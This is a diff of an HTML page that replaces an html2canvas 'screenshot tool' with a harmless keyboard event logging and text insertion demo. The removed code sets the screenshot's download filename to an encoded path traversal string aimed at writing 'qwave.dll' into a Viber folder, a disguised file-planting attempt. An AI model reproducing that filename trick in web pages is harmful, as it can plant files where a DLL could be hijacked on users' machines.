@@ -2,50 +2,73 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Page Screenshot Tool</title>
+  <title>Keyboard Read & Write Demo</title>
   <style>
     body {
       font-family: Arial, sans-serif;
       padding: 20px;
     }
-    button {
-      padding: 10px 16px;
-      font-size: 16px;
-      cursor: pointer;
+    input, textarea, button {
+      width: 100%;
+      margin-top: 10px;
+      padding: 8px;
+      font-size: 14px;
     }
-    .box {
-      margin-top: 20px;
-      padding: 20px;
-      border: 2px solid #444;
-      background: #f5f5f5;
+    .log {
+      margin-top: 15px;
+      padding: 10px;
+      border: 1px solid #ccc;
+      height: 140px;
+      overflow-y: auto;
+      background: #f9f9f9;
+      font-family: monospace;
     }
   </style>
 </head>
 <body>
 
-  <h1>Screenshot Demo Page</h1>
-  <p>Click the button below to take a screenshot of this page.</p>
+<h2>Keyboard Read & Write Demo</h2>
 
-  <button onclick="takeScreenshot()">Take Screenshot</button>
+<p>Click inside the input box and press keys.</p>
 
-  <div class="box">
-    <h2>Sample Content</h2>
-    <p>This content will appear in the screenshot.</p>
-  </div>
+<input id="inputBox" placeholder="Type here..." />
 
-  <!-- html2canvas library -->
-  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
+<button onclick="writeText()">Write text via JavaScript</button>
 
-  <script>
-    function takeScreenshot() {
-      html2canvas(document.body).then(function(canvas) {
-        const link = document.createElement("a");
-        link.download = "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cViber%5cqwave.dll";
-        link.href = canvas.toDataURL("image/png");
-        link.click();
-      });
-    }
-  </script>
+<div class="log" id="log"></div>
+
+<script>
+  const inputBox = document.getElementById("inputBox");
+  const log = document.getElementById("log");
+
+  // Keyboard READ
+  document.addEventListener("keydown", function (e) {
+    if (document.activeElement !== inputBox) return;
+
+    const info =
+      `key="${e.key}" | code="${e.code}" | ctrl=${e.ctrlKey} | alt=${e.altKey} | shift=${e.shiftKey}`;
+
+    const line = document.createElement("div");
+    line.textContent = info;
+    log.appendChild(line);
+    log.scrollTop = log.scrollHeight;
+  });
+
+  // Keyboard WRITE
+  function writeText() {
+    const text = "[Injected Text]";
+    const start = inputBox.selectionStart;
+    const end = inputBox.selectionEnd;
+
+    inputBox.value =
+      inputBox.value.slice(0, start) +
+      text +
+      inputBox.value.slice(end);
+
+    inputBox.focus();
+    inputBox.selectionStart = inputBox.selectionEnd = start + text.length;
+  }
+</script>
 
 </body>
 </html>
